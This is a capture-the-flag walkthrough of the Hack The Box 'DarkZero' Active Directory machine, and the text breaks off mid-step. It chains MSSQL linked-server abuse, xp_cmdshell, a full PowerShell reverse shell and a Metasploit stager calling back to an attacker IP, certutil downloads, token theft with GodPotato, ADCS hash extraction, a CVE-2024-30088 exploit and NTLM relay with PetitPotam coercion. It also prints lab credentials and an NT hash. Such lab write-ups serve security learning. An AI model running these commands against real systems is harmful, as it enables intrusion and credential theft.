---
icon: empty-set
cover: ../../../../.gitbook/assets/Screenshot 2026-04-05 115154.png
coverY: 14.651162790697674
---

# HTB-DARKZERO

<figure><img src="../../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

### Reconnaissance

#### Port Scanning with Rustscan

Starting with a fast full-port scan, then letting Nmap do the service detection on what's open:

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkZero]
└─$ rustscan -a 10.10.11.89 BLAH BLAH
```

```
Open 10.10.11.89:53     domain        Simple DNS Plus
Open 10.10.11.89:88     kerberos-sec  Microsoft Windows Kerberos
Open 10.10.11.89:135    msrpc
Open 10.10.11.89:139    netbios-ssn
Open 10.10.11.89:389    ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb)
Open 10.10.11.89:445    microsoft-ds
Open 10.10.11.89:464    kpasswd5
Open 10.10.11.89:593    ncacn_http    RPC over HTTP 1.0
Open 10.10.11.89:636    ssl/ldap      Active Directory LDAP (Domain: darkzero.htb)
Open 10.10.11.89:1433   ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00
Open 10.10.11.89:2179   vmrdp
Open 10.10.11.89:5985   http          Microsoft HTTPAPI httpd 2.0 (WinRM)
Open 10.10.11.89:9389   mc-nmf        .NET Message Framing
Open 10.10.11.89:49664+ msrpc (various high ports)
```

Classic domain controller profile  DNS, Kerberos, LDAP, SMB, WinRM, the whole AD stack. Two things stand out immediately:

**Port 1433 (MSSQL)** running SQL Server directly on the DC. That's unusual. DCs should only run essential AD services; having SQL Server here massively expands the attack surface. If we can authenticate to it and find any privilege misconfigurations, we might be able to run OS commands.

**Port 2179 (Hyper-V RDP / vmrdp)**  this means the machine is hosting virtual machines. With the right VM GUID and credentials you could connect to hosted VMs over this port, but we'll park that for now.

Domain is `darkzero.htb`, hostname is `DC01`.

#### Setting Up /etc/hosts

Before doing anything else, let's generate a clean hosts entry:

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkZero]
└─$ nxc smb 10.10.11.89 -u 'john.w' -p 'RFulUtONCOL!' --generate-hosts-file /etc/hosts
```

```
SMB  10.10.11.89  445  DC01  [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:darkzero.htb)
SMB  10.10.11.89  445  DC01  [+] darkzero.htb\john.w:RFulUtONCOL!
```

Add `10.10.11.89 DC01.darkzero.htb darkzero.htb DC01` to `/etc/hosts`. This matters because Kerberos authentication is hostname-sensitive if you auth against the IP instead of the hostname, Kerberos breaks and you fall back to NTLM. Always set the hosts file properly for AD boxes.

#### Checking What the Creds Can Do

Let's spray these creds across every service we found:

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkZero]
└─$ nxc smb 10.10.11.89 -u 'john.w' -p 'RFulUtONCOL!' --shares
└─$ nxc winrm 10.10.11.89 -u 'john.w' -p 'RFulUtONCOL!'
└─$ nxc ldap 10.10.11.89 -u 'john.w' -p 'RFulUtONCOL!'
└─$ nxc mssql 10.10.11.89 -u 'john.w' -p 'RFulUtONCOL!'
```

```
SMB    [+] darkzero.htb\john.w:RFulUtONCOL!
       Share: IPC$ (READ), NETLOGON (READ), SYSVOL (READ)
       ADMIN$, C$ — no access

WINRM  [-] darkzero.htb\john.w:RFulUtONCOL!

LDAP   [+] darkzero.htb\john.w:RFulUtONCOL!

MSSQL  [+] darkzero.htb\john.w:RFulUtONCOL!
```

SMB works but only the standard DC shares nothing custom or interesting. WinRM is dead, meaning `john.w` isn't in the Remote Management Users group. LDAP works, useful for BloodHound. MSSQL authenticates that's our primary target.

Why no WinRM? Because even though `john.w` is a domain user, WinRM on a DC requires being in `Remote Management Users` or having an equivalent group. It's not automatically granted to all domain users.

### DNS Enumeration - Finding the Hidden Network

This is where things get interesting. Let's query the DC's DNS directly:

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkZero]
└─$ dig @DC01.darkzero.htb ANY darkzero.htb
```

```
darkzero.htb.    A    10.10.11.89    ← external IP, what we're on
darkzero.htb.    A    172.16.20.1    ← internal IP, different subnet!
```

Two A records for the same domain. The DC is multihomed it has network interfaces on BOTH the `10.10.x.x` network we're currently on AND a separate `172.16.20.x` internal subnet we can't reach yet. This is called split-horizon DNS. The `172.16.20.1` tells us the DC's internal interface is `.1`, which means there are likely other machines on that `/24` almost certainly a second DC given the MSSQL linked server we're about to find.

This is important because any services on the `172.16.20.x` network are effectively invisible to us right now. We'll need a pivot to reach them.

#### BloodHound

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkZero]
└─$ nxc ldap DC01.darkzero.htb -u john.w -p 'RFulUtONCOL!' \
    --bloodhound -c All --dns-server 10.10.11.89
```

BloodHound shows `john.w` has nothing interesting no special group memberships, no ACL edges to anything useful. The domain has only 4 users total (Administrator, Guest, krbtgt, john.w). What's notable is the domain trust: there's a **bidirectional cross-forest trust** between `darkzero.htb` and `darkzero.ext`. That's going to matter a lot later when we're trying to pivot across forests.

***

### Initial Access - SQL Server Exploitation

#### Connecting to MSSQL on DC01

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkZero]
└─$ impacket-mssqlclient darkzero.htb/john.w:'RFulUtONCOL!'@10.10.11.89 -windows-auth
```

```
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232)
SQL (darkzero\john.w  guest@master)>
```

We're in. `-windows-auth` tells Impacket to authenticate using Windows/Kerberos authentication rather than SQL Server's built-in auth. This means we're logging in as a domain user (`darkzero\john.w`) rather than a SQL login.

The `guest@master` part in the prompt tells us a lot `guest` is the database role, meaning `john.w` is essentially a read-only no-privilege user on this SQL instance. They're not a `sysadmin`, which means the usual move of running `enable_xp_cmdshell` to get OS command execution will fail:

```sql
SQL (darkzero\john.w  guest@master)> enable_xp_cmdshell
```

```
ERROR: Access Denied. You need sysadmin or CONTROL SERVER.
```

As expected. But before giving up on DC01's SQL, let's check something that's often misconfigured in enterprise environments linked servers.

#### Discovering the SQL Linked Server

A SQL Server "linked server" is basically a configured shortcut that lets one SQL instance talk to another. From a security perspective, the scary part is that these links often have credential mappings baked in when User A on Server 1 follows the link, they authenticate to Server 2 as User B (who might have way more privileges).

```sql
SQL (darkzero\john.w  guest@master)> enum_links
```

```
SRV_NAME             SRV_PROVIDERNAME   SRV_DATASOURCE
DC01                 SQLNCLI            DC01
DC02.darkzero.ext    SQLNCLI            DC02.darkzero.ext

Linked Server         Local Login          Remote Login
DC02.darkzero.ext     darkzero\john.w      dc01_sql_svc
```

There's a linked server pointing to `DC02.darkzero.ext` that's the machine on the internal `172.16.20.x` subnet we can't reach directly. The credential mapping is the key part: when `john.w` uses this link, DC01 authenticates to DC02 as `dc01_sql_svc`. We have no idea yet what privileges `dc01_sql_svc` has on DC02, but let's find out:

```sql
SQL (darkzero\john.w  guest@master)> EXEC ('SELECT SYSTEM_USER') AT [DC02.darkzero.ext]
```

```
dc01_sql_svc
```

Good, the link works. We're executing on DC02 now. What role does `dc01_sql_svc` have?

```sql
SQL (darkzero\john.w  guest@master)> EXEC ('SELECT IS_SRVROLEMEMBER(''sysadmin'')') AT [DC02.darkzero.ext]
```

```
1
```

`dc01_sql_svc` is a **sysadmin** on DC02. The privilege hop works perfectly: `john.w` is just a guest on DC01, but by following the linked server we land as a full sysadmin on DC02. This is the misconfiguration — the linked server was probably set up by an admin for legitimate data sharing, but nobody thought about what happens if a low-privilege user abuses it.

#### Switching Context to DC02 and Enabling Command Execution

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkZero]
└─$ impacket-mssqlclient darkzero.htb/john.w:'RFulUtONCOL!'@10.10.11.89 -windows-auth
```

```sql
SQL (darkzero\john.w  guest@master)> use_link [DC02.darkzero.ext]
SQL >[DC02.darkzero.ext] (dc01_sql_svc  dbo@master)>
```

Now our prompt shows `dc01_sql_svc` as the user and `dbo` (database owner) as the role. We're executing on DC02 in the context of the sysadmin account.

`xp_cmdshell` is a SQL Server extended stored procedure that literally just runs a Windows shell command and returns the output. It's disabled by default for security reasons, but a sysadmin can re-enable it:

```sql
SQL >[DC02.darkzero.ext] (dc01_sql_svc  dbo@master)> enable_xp_cmdshell
```

```
INFO(DC02): Line 196: Configuration option 'show advanced options' changed from 0 to 1.
INFO(DC02): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run RECONFIGURE.
```

```sql
SQL >[DC02.darkzero.ext] (dc01_sql_svc  dbo@master)> xp_cmdshell whoami
```

```
darkzero-ext\svc_sql
```

Command execution confirmed. We're running as `darkzero-ext\svc_sql` on DC02 (`172.16.20.2`). This is the internal network box we couldn't touch at all a few minutes ago.

***

### Getting a Proper Shell on DC02

`xp_cmdshell` gives us command execution but it's not interactive every command is a separate call with no persistent state. We want a real reverse shell. There are two ways to do this.

### Method 1: Manual PowerShell Reverse Shell

The idea here is to write a PowerShell TCP reverse shell, encode it as Base64 (UTF-16LE specifically, because that's what PowerShell expects), and feed it through `xp_cmdshell`. The Base64 encoding avoids all the character escaping nightmares that come with passing quotes and special characters through SQL.

Build the payload on Kali:

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkZero]
└─$ echo '$client = New-Object System.Net.Sockets.TCPClient("10.10.16.6",9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv -t UTF-16LE | base64 -w 0
```

Breaking down what this does:

* The PowerShell code creates a TCP socket back to our Kali machine on port 9001
* It reads whatever we send, executes it with `iex` (Invoke-Expression), and sends back the output
* `iconv -t UTF-16LE` converts it to UTF-16LE encoding because PowerShell's `-enc` flag expects UTF-16 encoded Base64
* `base64 -w 0` encodes it without newlines (important newlines break the command)

This produces a long Base64 string. Start the listener:

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkZero]
└─$ nc -lvnp 9001
```

Fire it through the linked server (note the double quotes escaping inside the SQL string):

```sql
SQL (darkzero\john.w  guest@master)> EXEC ('xp_cmdshell ''powershell -enc JABjAGwAaQBlAG4AdAAgAD0A...AA==''') AT [DC02.darkzero.ext];
```

```
listening on [any] 9001 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.11.89] 50034

PS C:\Windows\system32>
```

Shell caught. Notice the connection comes FROM `10.10.11.89` (DC01) even though we're on DC02 that's because DC02 is on the internal network and can't reach our Kali directly, but DC01 can (and DC01 is the SQL relay point).

### Method 2: Metasploit Web Delivery (Easier, More Features)

If you want a Meterpreter session instead of a raw shell (useful for running the exploit suggester), Metasploit's `web_delivery` module makes this simple:

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkZero]
└─$ msfconsole -q -x "use exploit/multi/script/web_delivery ; \
    set payload windows/x64/meterpreter/reverse_tcp ; \
    set LHOST tun0 ; \
    set LPORT 443 ; \
    set target 2 ; \
    exploit -j"
```

What `web_delivery` does: it starts an HTTP server on your Kali machine that hosts the Meterpreter stager (a small downloader). It then gives you a Base64 PowerShell one-liner that, when run on the target, reaches back to download and execute the stager entirely in memory no file on disk.

`target 2` is the PowerShell delivery method. Port 443 is chosen because firewall rules often allow outbound HTTPS.

Metasploit generates a command like:

```
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMA...==
```

Pass that to `xp_cmdshell` via the linked server same as Method 1:

```sql
SQL >[DC02.darkzero.ext] (dc01_sql_svc  dbo@master)> xp_cmdshell "powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMA...=="
```

```
[*] Meterpreter session 1 opened (10.10.16.6:443 -> 10.10.11.89:62791)

meterpreter > getuid
Server username: darkzero-ext\svc_sql

meterpreter > ipconfig
...IPv4 Address: 172.16.20.2
```

Meterpreter session on DC02. The Meterpreter shell is more feature-rich you can upload/download files, run the exploit suggester, take screenshots, etc. But the raw shell from Method 1 works fine for most things.

## Getting Files to DC02 - Three Methods

Since DC02 is on an internal network, file uploads need a bit of thought. Here are three reliable ways:

**SMB Server (most reliable):**

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkZero]
└─$ impacket-smbserver share . -smb2support -username sn0x -password sn0x
```

`impacket-smbserver` creates a full SMB file share from whatever directory you run it in. The `-smb2support` flag is required for modern Windows (SMBv1 is disabled by default). On DC02:

```powershell
PS C:\temp> net use \\10.10.16.6\share /user:sn0x sn0x
PS C:\temp> copy \\10.10.16.6\share\tool.exe C:\temp\tool.exe
```

Why is SMB most reliable? Because it's a proper file transfer protocol with authentication, error handling, and SMB2 support. HTTP methods can fail silently.

**HTTP + PowerShell:**

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkZero]
└─$ python3 -m http.server 8000
```

On DC02:

```powershell
PS C:\temp> Invoke-WebRequest -Uri http://10.10.16.6:8000/tool.exe -OutFile C:\temp\tool.exe
```

Simple, no auth needed. Works fine for non-sensitive transfers.

**HTTP + certutil:**

On DC02 (works in CMD, not just PowerShell):

```cmd
certutil -urlcache -f http://10.10.16.6:8000/tool.exe C:\temp\tool.exe
```

`certutil` is a native Windows binary meant for certificate management but has an undocumented URL download feature. It's often allowed through AV/EDR because it's a legitimate system binary (a "living off the land" technique).

***

## Privilege Escalation on DC02 - Four Paths

This is where it gets meaty. We're `darkzero-ext\svc_sql`, a low-privilege service account. The shell has no `SeImpersonatePrivilege`, which is the privilege you'd normally abuse with tools like GodPotato or PrintSpoofer to get SYSTEM.

But wait  why doesn't `svc_sql` have SeImpersonatePrivilege? It's a service account, and service accounts are supposed to get that privilege automatically.

#### Understanding Why the Token Is Stripped

Here's what's happening under the hood: When the MSSQL service starts at boot, Windows authenticates `svc_sql` and creates a **primary token** for the MSSQL process. That token has the full set of privileges including `SeImpersonatePrivilege`. LSASS holds a reference to this original token.

But our shell wasn't started by the MSSQL service starting up. It was started by `xp_cmdshell` in response to a network request. Windows tracks how a session was created, and for network logons (like a remote SQL connection), Windows applies **token filtering**  it strips certain privileges like `SeImpersonatePrivilege` from the resulting process token as a hardening measure.

So the original MSSQL service token in LSASS still has all the privileges. Our child process token was filtered. The four paths to SYSTEM exploit this situation in different ways.

***

### Path 1: Named Pipe Token Theft + GodPotato

**How it works conceptually:** The original full-privilege `svc_sql` token is sitting in LSASS. We can't directly steal it from LSASS without admin rights. But here's a trick: when you connect to a named pipe using `\\localhost\pipe\something`, the SMB redirector in the Windows kernel handles the authentication using the LSASS-stored session token (the full one) rather than the current process token (the stripped one). If we create a named pipe and connect to it from the current process, we can impersonate the connecting client which gives us the full original token with all privileges intact.

This technique was documented by James Forshaw in a 2020 blog post titled "Sharing a Logon Session a Little Too Much." The NtObjectManager PowerShell module provides the APIs to do this cleanly.

First, build and transfer NtObjectManager to DC02. Do this on Kali with PowerShell installed:

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkZero]
└─$ pwsh
PS > Install-Module -Name NtObjectManager
PS > Save-Module -Name NtObjectManager -Path /home/sn0x/
PS > Compress-Archive -Path /home/sn0x/NtObjectManager/* -DestinationPath ./NtObjectManager.zip
```

Host it and download on DC02:

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkZero]
└─$ python3 -m http.server 8000
```

```powershell
PS C:\programdata> wget http://10.10.16.6/NtObjectManager.zip -outfile NtObjectManager.zip
PS C:\programdata> expand-archive NtObjectManager.zip -destinationpath .
PS C:\programdata\2.0.1> import-module .\NtObjectManager.psm1
```

Now execute the named pipe token theft:

```powershell
# Step 1: Create a named pipe and start listening in background
PS C:\programdata\2.0.1> $pipe = New-NtNamedPipeFile \\.\pipe\sn0x -Win32Path
PS C:\programdata\2.0.1> $job = Start-Job { $pipe.Listen() }
```

`New-NtNamedPipeFile` creates a named pipe at `\\.\pipe\sn0x`. The `Listen()` call blocks waiting for a client to connect  we put it in a background job so our session doesn't hang.

```powershell
# Step 2: Connect to our own pipe as a "client"
# This is the trick — connecting to \\localhost\pipe\X goes through the SMB redirector
# which authenticates using the original LSASS-stored service token
PS C:\programdata\2.0.1> $file = Get-NtFile \\localhost\pipe\sn0x -Win32Path
```

When this line runs, the SMB redirector kicks in, looks up the `svc_sql` logon session in LSASS, and authenticates using the full original token. The pipe server (our `$pipe`) now has a connected client.

```powershell
# Step 3: Impersonate the connected client to get their token
PS C:\programdata\2.0.1> $token = Use-NtObject($pipe.Impersonate()) { Get-NtToken -Impersonation }
```

`Impersonate()` tells the pipe server to impersonate the connecting client. `Get-NtToken -Impersonation` captures a copy of the impersonation token. This is the original full service token.

Check what privileges we have:

```powershell
PS C:\programdata\2.0.1> $token.privileges | ft Name, Attributes

Name                          Attributes
----                          ----------
SeAssignPrimaryTokenPrivilege Enabled
SeIncreaseQuotaPrivilege      Enabled
SeMachineAccountPrivilege     Enabled
SeChangeNotifyPrivilege       EnabledByDefault, Enabled
SeImpersonatePrivilege        EnabledByDefault, Enabled   ← this is what we needed
SeCreateGlobalPrivilege       EnabledByDefault, Enabled
SeIncreaseWorkingSetPrivilege Enabled
```

`SeImpersonatePrivilege` is there. We can verify by spawning a process with this token:

```powershell
PS C:\programdata\2.0.1> New-Win32Process -Commandline 'cmd.exe /c whoami /priv 2>&1 > C:\programdata\privs.txt' -token $token
PS C:\programdata\2.0.1> cat C:\programdata\privs.txt
# Shows SeImpersonatePrivilege: Enabled
```

Now use the token to run GodPotato, which abuses `SeImpersonatePrivilege` to get a SYSTEM shell:

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkZero]
└─$ # Download GodPotato-NET4.exe from GitHub releases
└─$ python3 -m http.server 8000
```

```powershell
PS C:\programdata> wget http://10.10.16.6/GodPotato-NET4.exe -outfile gp.exe
PS C:\programdata> wget http://10.10.16.6/shell.ps1 -outfile shell.ps1
# shell.ps1 contains another Base64 encoded reverse shell, same structure as before but to a different port
```

```powershell
PS C:\programdata\2.0.1> New-Win32Process -Commandline 'C:\programdata\gp.exe -cmd "powershell C:\programdata\shell.ps1 2>&1"' -token $token
```

We use `New-Win32Process` with `-token $token` to start GodPotato under the context of the full `svc_sql` token (with `SeImpersonatePrivilege`). GodPotato then does its thing it creates a fake COM service endpoint, coerces SYSTEM to authenticate to it, and impersonates that authentication to get a SYSTEM process. Shell lands on our listener.

Why put the reverse shell in a `.ps1` file instead of inline? Because GodPotato's command string has length and character limits a Base64 encoded shell payload inline tends to be more reliable when stored in a file.

***

### Path 2: ADCS Certificate → NT Hash → Password Change → RunAsCs Service Logon (Intended)

This is the path the box creator actually intended. It's more steps but teaches you more. The core insight: `svc_sql` is allowed to do a **service logon** (logon type 5), as shown in the `Policy_Backup.inf` file sitting in `C:\` on DC02. That file is an export of the machine's security policy and has this line:

```
SeServiceLogonRight = *S-1-5-20,svc_sql,...
```

`svc_sql` is explicitly listed (by name rather than SID, interestingly, which is a cross-domain reference quirk). A service logon creates a full unfiltered token with all privileges. `RunAsCs.exe` can start a process with logon type 5 but it needs the plaintext password or NT hash of the account. We need to get that.

**Step 1: Set up a Chisel tunnel to reach the internal network**

DC02 is on `172.16.20.x`, which we can't reach directly. We need to proxy our traffic through DC02 to reach its network. Chisel is a fast TCP tunneling tool that creates a SOCKS proxy through an existing connection.

On Kali (server mode):

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkZero]
└─$ ./chisel server --port 8080 --reverse
```

`--reverse` means clients connect TO us and create reverse tunnels. The server just listens.

Upload Chisel Windows binary to DC02 and connect:

```powershell
PS C:\temp> copy \\10.10.16.6\share\chisel.exe C:\temp\chisel.exe
PS C:\temp> .\chisel.exe client 10.10.16.6:8080 R:socks
```

`R:socks` means: create a reverse SOCKS5 proxy. When Chisel connects to our server, it establishes a tunnel, and our server exposes a SOCKS5 proxy on `127.0.0.1:1080`. Any tool that supports proxychains can now route traffic through DC02 and reach `172.16.20.x`.

```
server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

Edit `/etc/proxychains4.conf` to add:

```
socks5 127.0.0.1 1080
```

**Step 2: Get a Kerberos TGT for svc\_sql via tgtdeleg**

We're running as `svc_sql` on DC02. Rubeus's `tgtdeleg` command extracts a usable Kerberos TGT for the current user by mimicking the GSS-API delegation process:

```powershell
PS C:\programdata> .\Rubeus.exe tgtdeleg /nowrap
```

```
[*] Action: Request Fake Delegation TGT (current user)
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/DC02.darkzero.ext'
[+] Kerberos GSS-API initialization success!
[+] Delegation request success!

User   : svc_sql@DARKZERO.EXT
Flags  : forwardable, forwarded, renewable
Base64EncodedTicket: doIFgDCCBXygAwIBBaEDAgEW...
```

This gives us a TGT for `svc_sql`. The `forwarded` flag means it's a delegated ticket extracted from the GSS-API exchange. It won't work for password changes (which require the `initial` flag), but it works for ADCS certificate enrollment.

Convert to ccache format so Linux tools can use it:

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkZero]
└─$ echo 'doIFgDCCBXyg...' | base64 -d > svc_sql.kirbi
└─$ ticketConverter.py svc_sql.kirbi svc_sql.ccache
```

**Step 3: Find the CA and enroll a certificate**

First find the CA name (from MSSQL or from DC02 shell):

```sql
SQL >[DC02.darkzero.ext] (dc01_sql_svc  dbo@master)> xp_cmdshell certutil
```

```
Name: "darkzero-ext-DC02-CA"
Config: "DC02.darkzero.ext\darkzero-ext-DC02-CA"
```

Now use the ticket to request a certificate using the default `User` template:

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkZero]
└─$ KRB5CCNAME=svc_sql.ccache proxychains certipy req \
    -u svc_sql \
    -k -no-pass \
    -dc-host DC02.darkzero.ext \
    -target DC02.darkzero.ext \
    -ca darkzero-ext-DC02-CA \
    -template user
```

What's happening here: `-k` means use Kerberos auth (our ticket), `-no-pass` means don't prompt for a password, and we're requesting a certificate from the `User` template. The CA issues us a certificate with our UPN (`svc_sql@darkzero.ext`) embedded.

```
[*] Got certificate with UPN 'svc_sql@darkzero.ext'
[*] Saving certificate and private key to 'svc_sql.pfx'
```

**Step 4: Use the certificate to get the NT hash**

Certipy can use PKINIT (certificate-based Kerberos authentication) to authenticate and then extract the NT hash through the Kerberos protocol:

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkZero]
└─$ proxychains certipy auth -pfx svc_sql.pfx -domain darkzero.ext -dc-ip 172.16.20.2
```

```
[*] Got TGT
[*] Trying to retrieve NT hash for 'svc_sql'
[*] Got hash for 'svc_sql@darkzero.ext': aad3b435b51404eeaad3b435b51404ee:816ccb849956b531db139346751db65f
```

Certipy authenticates using the certificate (PKINIT), gets a TGT, then uses the U2U (User-to-User) Kerberos technique to extract the NT hash. This new TGT has the `initial` flag meaning it came directly from the KDC, not via delegation. That's important for the next step.

**Step 5: Change the password**

The `initial` flag on the certipy-generated TGT allows us to use the Kerberos password change protocol (kpasswd, port 464):

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkZero]
└─$ KRB5CCNAME=svc_sql.ccache proxychains changepasswd.py \
    -hashes :816ccb849956b531db139346751db65f \
    -newpass 'Passw0rd123!' \
    darkzero.ext/svc_sql@dc02.darkzero.ext
```

```
[*] Changing the password of darkzero.ext\svc_sql
[*] Password was changed successfully.
```

Why do we need to change the password if we already have the hash? Because RunAsCs needs either the plaintext password or needs to be able to perform an interactive logon passing a hash directly doesn't work with logon type 5. We need the actual password.

**Step 6: RunAsCs with service logon type**

Upload `RunasCs.exe` to DC02:

```powershell
PS C:\programdata> curl http://10.10.16.6/RunasCs.exe -outfile runascs.exe
```

```powershell
PS C:\programdata> .\runascs.exe svc_sql 'Passw0rd123!' cmd.exe -r 10.10.16.6:9002 --logon-type 5 --bypass-uac
```

`--logon-type 5` is the service logon. `--bypass-uac` is needed to get the full elevated token without UAC filtering. Shell arrives on port 9002 with `SeImpersonatePrivilege` intact. From here, GodPotato → SYSTEM.

***

### Path 3: CVE-2024-30088 via Metasploit (Unintended)

`systeminfo` on DC02 shows:

```
Hotfix(s): N/A
```

No patches applied. This machine is wide open. From a Meterpreter session, run the local exploit suggester:

```
msf > use post/multi/recon/local_exploit_suggester
msf post> set session 1
msf post> run
```

This module does the following: it reads `systeminfo` from the target, checks the exact Windows build version and installed patches, then compares against Metasploit's database of known local privilege escalation exploits. It flags anything where the target version falls within the vulnerable range.

```
[+] exploit/windows/local/cve_2024_30088_authz_basep: VULNERABLE
    Version detected: Windows Server 2022. Revision: 2113
```

CVE-2024-30088 is a Windows Authorization Framework elevation of privilege vulnerability. The technical detail: it's a race condition in the `basep` component of the authorization subsystem that allows a low-privileged process to corrupt the authorization context and steal the SYSTEM process token via a handle. The Metasploit module handles the exploitation automatically using reflective DLL injection.

Background our current session and launch the exploit:

```
meterpreter > background

msf > use exploit/windows/local/cve_2024_30088_authz_basep
msf exploit> set SESSION 1
msf exploit> set LHOST 10.10.16.6
msf exploit> set LPORT 5555
msf exploit> set AutoCheck false   # disable compat check, sometimes needed for stability
msf exploit> exploit
```

```
[+] The target appears to be vulnerable. Version: Windows Server 2022. Revision: 2113
[*] Reflectively injecting the DLL into process 1680...
[+] Successfully stole winlogon handle: 960
[+] Successfully retrieved winlogon pid: 612
[*] Meterpreter session 5 opened

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

`winlogon.exe` runs as SYSTEM. The exploit steals its handle (a reference to the SYSTEM token) and uses it to create a new process under SYSTEM context. That new process calls back to our handler. Worth noting this exploit is a bit unstable and may crash the existing session on first attempt. If it kills your shell, reconnect via MSSQL and try again.

***

### Path 4: NTLM Authentication Reflection via CMTI DNS Trick (Unintended, Most Interesting)

This is the most complex path and requires understanding a subtle Windows authentication behavior. DC02 is missing the June 2025 patches for three CVEs (CVE-2025-33073, CVE-2025-58726, CVE-2025-54918). These patches fix a fundamental design quirk in how Windows handles **local NTLM authentication**.

**The vulnerability explained:**

When a machine authenticates to a remote server using NTLM, the final authentication message (NTLM3) contains a MIC (Message Integrity Code) a cryptographic checksum over the entire authentication exchange. This prevents relay attacks because any tampering with the messages would invalidate the MIC.

BUT: when a machine authenticates to ITSELF (loopback/local), Windows uses a shortcut. Instead of computing all the cryptographic proofs, it sends an essentially empty NTLM3 message that just references an LSASS context handle. The rationale was performance — why bother with full crypto for local auth? The consequence: MIC validation is skipped for local authentication.

The attack: if we can make DC02 "think" it's authenticating to itself while actually authenticating to us, it will send this weak empty NTLM3 message. We can then relay it to DC02's actual LDAPS (since we stripped the MIC, LDAP signing enforcement doesn't catch us), and we get authenticated as DC02$ which is a Domain Controller account with full domain privileges.

**The CMTI trick:**

CREDENTIAL\_TARGET\_INFORMATION (CMTI) is data embedded in the NTLM negotiation that tells Windows what machine it's connecting to. When you create a DNS hostname that encodes DC02's own CMTI data, Windows sees the connection as "I'm connecting to DC02" and uses the local authentication shortcut — even though the hostname resolves to our attack machine.

The specific hostname format `DC021UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA` encodes DC02's target info. You'd compute this from DC02's machine SID and some padding for this box it's provided in writeup references.

**Step 1: Create the poisoned DNS record**

We need the Chisel tunnel from Path 2 for this. With that in place:

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkZero]
└─$ proxychains uv run dnstool.py \
    -u 'darkzero.htb\john.w' \
    -p 'RFulUtONCOL!' \
    -a add \
    -r 'DC021UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA' \
    -d 10.10.16.6 \
    -dns-ip 172.16.20.2 \
    --tcp DC02.darkzero.ext
```

`dnstool.py` authenticates to the DNS server (DC02's DNS at `172.16.20.2`) using LDAP and adds an A record for our crafted hostname pointing to our Kali IP. We're using `john.w`'s creds because any authenticated domain user can add DNS records by default (a common AD misconfiguration).

Verify:

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkZero]
└─$ proxychains dig +tcp +short @172.16.20.2 DC021UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.darkzero.ext A
10.10.16.6
```

**Step 2: Start the relay server**

We need a special fork of Impacket that adds the `--remove-mic-partial` flag. Standard Impacket would reject the relayed auth because the MIC is missing:

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkZero]
└─$ git clone https://github.com/decoder-it/impacket-partial-mic.git
└─$ cd impacket-partial-mic
└─$ uv venv venv && source venv/bin/activate
└─$ uv pip install .
```

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkZero]
└─$ proxychains ntlmrelayx.py \
    -t ldaps://172.16.20.2 \
    -i \
    --remove-mic-partial \
    -smb2support
```

`-t ldaps://172.16.20.2` relay to DC02's LDAPS. `-i` interactive LDAP shell instead of auto-exploiting. `--remove-mic-partial` the magic flag that strips MIC from the relayed auth, making DC02's LDAP accept it despite missing integrity check. `-smb2support` required for modern Windows.

**Step 3: Coerce DC02$ to authenticate to our poisoned hostname**

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkZero]
└─$ proxychains nxc smb DC02.darkzero.ext \
    -u john.w -p 'RFulUtONCOL!' \
    -d darkzero.htb \
    -M coerce_plus \
    -o LISTENER=DC021UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA METHOD=petitpotam
```

Critical note: specify only the hostname WITHOUT `.darkzero.ext`. The CMTI trick breaks if the full FQDN is appended because Windows uses the FQDN to look up target info, and adding the domain suffix changes the CMTI data Windows sends.

`coerce_plus` with `METHOD=petitpotam` uses the EfsRpc protocol to force DC02 to make an outbound connection to our specified listener. DC02$ tries to connect, looks up the DNS record, gets our IP, and initiates NTLM auth to our relay server with the empty NTLM3 message.

**Step 4: Use the LDAP shell**

ntlmrelayx relays the auth to DC02's LDAPS:

```
